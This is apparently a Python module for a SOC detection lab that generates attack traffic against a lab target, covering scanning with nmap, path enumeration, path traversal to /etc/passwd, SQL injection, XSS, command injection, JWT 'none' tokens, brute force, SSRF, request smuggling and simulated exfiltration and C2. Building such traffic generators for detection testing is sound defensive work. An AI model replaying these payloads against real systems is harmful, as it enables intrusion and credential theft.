from __future__ import annotations

import urllib.parse
from typing import Callable

from .client import LabClient


def baseline(client: LabClient) -> None:
    for request_path in [
        "/", "/favicon.ico", "/assets/public/images/products/apple_juice.jpg",
        "/rest/products/search?q=apple", "/rest/products/search?q=juice",
        "/__gateway_health__", "/lab/health", "/lab/normal?q=ordinary",
    ]:
        client.request("GET", request_path, headers={"User-Agent": "Mozilla/5.0 SOC-Lab-Browser"})


def network_discovery(client: LabClient) -> None:
    client.command(["nc", "-vz", "-w", "2", client.target_host, str(client.target_port)])
    client.command(["nmap", "-sT", "-Pn", "-T3", "--max-retries", "1", "-p",
                    "22,23,53,80,443,3000,8080,9200,55000", client.target_host])
    client.command(["nmap", "-sT", "-Pn", "-sV", "--version-light", "-p",
                    str(client.target_port), client.target_host], timeout=30)
    client.request("GET", "/", headers={"User-Agent": "Nmap Scripting Engine"})


def web_enumeration(client: LabClient) -> None:
    for request_path in ["/", "/rest/products/search?q=orange", "/lab/health"]:
        client.request("GET", request_path)
    sensitive = [
        "/admin", "/administrator", "/api", "/api/v1", "/swagger", "/swagger-ui",
        "/swagger.json", "/openapi.json", "/api-docs", "/.env", "/.git/config",
        "/backup.zip", "/config.json", "/debug", "/metrics", "/server-status",
        "/actuator/env", "/graphql", "/database.bak", "/dump.sql",
    ]
    for request_path in sensitive:
        client.request("GET", request_path)


def scanner_fingerprint(client: LabClient) -> None:
    client.request("GET", "/rest/products/search?q=test", headers={"User-Agent": "sqlmap/1.8.12#stable"})
    client.request("GET", "/", headers={"User-Agent": "Nikto/2.5.0"})
    client.request("GET", "/", headers={"User-Agent": "Nmap Scripting Engine"})
    client.request("GET", "/", headers={"User-Agent": "Mozilla/5.0", "X-Scanner": "safe-lab-audit"})


def path_traversal(client: LabClient) -> None:
    for request_path in [
        "/lab/read?path=manual.txt",
        "/lab/read?path=../fixtures/manual.txt",
        "/lab/read?path=%2e%2e%2ffixtures%2fmanual.txt",
        "/lab/read?path=%252e%252e%252ffixtures%252fmanual.txt",
        "/lab/read?path=folder/./../manual.txt",
    ]:
        client.request("GET", request_path)


def linux_lfi(client: LabClient) -> None:
    for request_path in [
        "/lab/read?path=manual.txt",
        "/lab/read?path=../../../../etc/passwd",
        "/lab/read?path=..%2f..%2f..%2f..%2fetc%2fpasswd",
    ]:
        client.request("GET", request_path)


def sql_progression(client: LabClient) -> None:
    for value in ["apple", "'", "' OR '1'='1'--", "' OR '1'='2'--",
                  "1 UNION SELECT NULL--", "1 AND SLEEP(1)--"]:
        client.request("GET", "/rest/products/search?q=" + urllib.parse.quote(value, safe=""))


def obfuscated_sqli(client: LabClient) -> None:
    for request_path in [
        "/rest/products/search?q=%27%20OR%20%271%27%3D%271%27--",
        "/rest/products/search?q=%2527%2520OR%25201%253D1--",
        "/rest/products/search?q=1%20uNiOn%20SeLeCt%20NULL--",
        "/rest/products/search?q=1%2F%2Acomment%2A%2FUNION%2F%2Ax%2A%2FSELECT%20NULL--",
    ]:
        client.request("GET", request_path)


def xss(client: LabClient) -> None:
    values = [
        "Use <b>bold</b> text", "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>", "%3Csvg%20onload%3Dalert(1)%3E",
        '"><input autofocus onfocus=alert(1)>',
    ]
    for value in values:
        encoded = value if value.startswith("%3C") else urllib.parse.quote(value, safe="")
        client.request("GET", "/lab/reflect?q=" + encoded)


def command_injection(client: LabClient) -> None:
    for value in ["localhost", "localhost; whoami", "status | echo SOC-LAB", "host && whoami"]:
        client.json_request("POST", "/lab/command", {"input": value})


def prototype_pollution(client: LabClient) -> None:
    client.json_request("POST", "/lab/prototype-merge", {"theme": "blue", "language": "en"})
    client.json_request("POST", "/lab/prototype-merge", '{"__proto__":{"polluted":"yes"}}')
    client.json_request("POST", "/lab/prototype-merge", '{"constructor":{"prototype":{"admin":true}}}')


def jwt_tampering(client: LabClient) -> None:
    tokens = [
        "soclab.valid.signature",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0Iiwicm9sZSI6ImFkbWluIn0.modified",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.invalid-signature",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0Iiwicm9sZSI6ImFkbWluIn0.",
    ]
    for token in tokens:
        client.request("GET", "/lab/jwt", headers={"Authorization": "Bearer " + token})


def _auth_reset(client: LabClient) -> None:
    client.json_request("POST", "/lab/auth/reset", {})


def brute_force(client: LabClient) -> None:
    _auth_reset(client)
    for index in range(3):
        client.json_request("POST", "/lab/auth/login", {
            "email": "negative-control@soc.lab", "password": "wrong-" + str(index),
        })
    _auth_reset(client)
    for index in range(15):
        client.json_request("POST", "/lab/auth/login", {
            "email": "target-user@soc.lab", "password": "guess-" + str(index),
        })


def password_spray(client: LabClient) -> None:
    _auth_reset(client)
    for index in range(3):
        client.json_request("POST", "/lab/auth/login", {
            "email": "control-" + str(index) + "@soc.lab", "password": "control-" + str(index),
        })
    _auth_reset(client)
    for index in range(12):
        client.json_request("POST", "/lab/auth/login", {
            "email": "user-" + str(index) + "@soc.lab", "password": "Seasonal-Password-1!",
        })


def real_ssrf(client: LabClient) -> None:
    client.json_request("POST", "/lab/ssrf", {"destination": "not-allowlisted"})
    for destination in ["loopback", "internal", "metadata"]:
        client.json_request("POST", "/lab/ssrf", {"destination": destination})


def suspicious_upload(client: LabClient) -> None:
    client.upload("notes.txt", "text/plain", "ordinary SOC lab note")
    client.upload("test.php.txt", "text/plain", "<?php echo 'SOC-LAB-HARMLESS'; ?>")
    client.upload("image.jpg.exe.txt", "image/jpeg", "MZ-SOC-LAB-NOT-EXECUTABLE")
    client.upload("avatar.png.txt", "application/octet-stream", "fake-webshell-marker: SOC-LAB")


def data_exfiltration(client: LabClient) -> None:
    client.json_request("POST", "/lab/normal", {"message": "ordinary small request"})
    for mode in ["plain", "encoded", "large"]:
        client.json_request("POST", "/lab/exfil", {"mode": mode}, timeout=10)


def c2_beacon(client: LabClient) -> None:
    client.json_request("POST", "/lab/normal", {"host_id": "SOC-LAB-HOST-001", "status": "ok"})
    client.json_request("POST", "/lab/c2/start", {"count": 6, "interval_ms": 500}, timeout=15)


def http_framing(client: LabClient) -> None:
    client.request("POST", "/lab/normal", headers={"Content-Type": "application/json"}, body=b'{"ok":true}')
    host = client.target_host
    payloads = [
        "POST /lab/normal HTTP/1.1\r\nHost: " + host
        + "\r\nContent-Length: 4\r\nContent-Length: 9\r\nConnection: close\r\n\r\nTEST",
        "POST /lab/normal HTTP/1.1\r\nHost: " + host
        + "\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n",
        "POST /lab/normal HTTP/1.1\r\nHost: " + host
        + "\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: close\r\n\r\n0\r\n\r\n",
    ]
    for payload in payloads:
        client.raw_http(payload.encode("ascii"))


ACTIONS: dict[str, Callable[[LabClient], None]] = {
    "BASE-00": baseline,
    "RECON-01": network_discovery,
    "RECON-02": web_enumeration,
    "RECON-03": scanner_fingerprint,
    "WEB-04": path_traversal,
    "WEB-05": linux_lfi,
    "WEB-06": sql_progression,
    "WEB-07": obfuscated_sqli,
    "WEB-08": xss,
    "WEB-09": command_injection,
    "WEB-10": prototype_pollution,
    "AUTH-11": jwt_tampering,
    "AUTH-12": brute_force,
    "AUTH-13": password_spray,
    "SERVER-14": real_ssrf,
    "SERVER-15": suspicious_upload,
    "EXFIL-16": data_exfiltration,
    "C2-17": c2_beacon,
    "HTTP-18": http_framing,
}
